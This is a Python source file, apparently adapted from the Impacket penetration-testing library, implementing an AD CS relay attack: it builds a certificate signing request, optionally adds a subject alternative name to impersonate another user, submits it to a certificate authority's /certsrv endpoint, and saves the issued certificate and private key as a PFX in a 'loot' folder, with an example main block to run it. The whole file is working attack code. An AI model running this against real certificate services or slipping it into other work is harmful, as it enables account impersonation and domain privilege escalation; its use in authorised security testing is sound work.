# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies 
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   AD CS relay attack
#
# Authors:
#   Ex Android Dev (@ExAndroidDev)
#   Tw1sm (@Tw1sm)

import re
import base64
import os
import logging
import http.client

from cryptography import x509
from cryptography.x509.oid import NameOID, ObjectIdentifier
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.serialization import pkcs12

# Setup logging
LOG = logging.getLogger("ADCSAttack")
logging.basicConfig(level=logging.INFO)

# cache already attacked clients
ELEVATED = []

class ADCSAttack:

    def __init__(self, username, config, client):
        self.username = username
        self.config = config
        self.client = client  # HTTPConnection or HTTPSConnection

    def _run(self):
        key = rsa.generate_private_key(public_exponent=65537, key_size=4096)

        if self.username in ELEVATED:
            LOG.info('Skipping user %s since attack was already performed' % self.username)
            return

        current_template = self.config.template or ("Machine" if self.username.endswith("$") else "User")

        csr = self.generate_csr(key, self.username, self.config.altName)
        csr_b64 = csr.decode().replace("\n", "").replace("+", "%2b").replace(" ", "+")
        LOG.info("CSR generated!")

        certAttrib = self.generate_certattributes(current_template, self.config.altName)
        data = "Mode=newreq&CertRequest={}&CertAttrib={}&TargetStoreFlags=0&SaveCert=yes&ThumbPrint=".format(csr_b64, certAttrib)

        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(len(data))
        }

        LOG.info("Submitting certificate request...")
        self.client.request("POST", "/certsrv/certfnsh.asp", body=data, headers=headers)
        response = self.client.getresponse()
        ELEVATED.append(self.username)

        if response.status != 200:
            LOG.error("Error getting certificate! HTTP Status: %s", response.status)
            return

        content = response.read().decode()
        found = re.findall(r'location="certnew.cer\?ReqID=(.*?)&', content)
        if len(found) == 0:
            LOG.error("Error obtaining certificate ID!")
            return

        certificate_id = found[0]
        LOG.info("Got certificate ID: %s", certificate_id)

        self.client.request("GET", f"/certsrv/certnew.cer?ReqID={certificate_id}")
        response = self.client.getresponse()
        certificate_pem = response.read()

        certificate_store = self.generate_pfx(key, certificate_pem)
        loot_path = os.path.join(self.config.lootdir, f"{self.username}.pfx")

        try:
            os.makedirs(self.config.lootdir, exist_ok=True)
            with open(loot_path, 'wb') as f:
                f.write(certificate_store)
            LOG.info("Certificate successfully written to %s", loot_path)
        except Exception as e:
            LOG.error("Unable to write certificate to file: %s", e)
            LOG.info("Base64-encoded PKCS#12:\n%s", base64.b64encode(certificate_store).decode())

        if self.config.altName:
            LOG.info("This certificate can also be used for user: %s", self.config.altName)

    def generate_csr(self, key, CN, altName):
        LOG.info("Generating CSR...")
        subject = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, CN)])
        builder = x509.CertificateSigningRequestBuilder().subject_name(subject)

        if altName:
            san = x509.OtherName(
                ObjectIdentifier("1.3.6.1.4.1.311.20.2.3"),
                altName.encode("utf-8")
            )
            builder = builder.add_extension(
                x509.SubjectAlternativeName([san]),
                critical=False
            )

        csr = builder.sign(key, hashes.SHA256())
        return csr.public_bytes(serialization.Encoding.PEM)

    def generate_pfx(self, key, certificate_pem):
        cert = x509.load_pem_x509_certificate(certificate_pem)
        pfx = pkcs12.serialize_key_and_certificates(
            name=self.username.encode(),
            key=key,
            cert=cert,
            cas=None,
            encryption_algorithm=serialization.NoEncryption()
        )
        return pfx

    def generate_certattributes(self, template, altName):
        if altName:
            return f"CertificateTemplate:{template}%0d%0aSAN:upn={altName}"
        return f"CertificateTemplate:{template}"


# Example config object
class Config:
    def __init__(self, server, template, altName, lootdir, use_https=False):
        self.server = server
        self.template = template
        self.altName = altName
        self.lootdir = lootdir
        self.use_https = use_https


# Example usage
if __name__ == "__main__":
    import sys
    from urllib.parse import urlparse

    # You can modify these for testing
    server = "ca-server.local"
    config = Config(server=server, template="User", altName=None, lootdir="loot", use_https=True)

    if config.use_https:
        conn = http.client.HTTPSConnection(config.server)
    else:
        conn = http.client.HTTPConnection(config.server)

    attack = ADCSAttack("testuser", config, conn)
    attack._run()
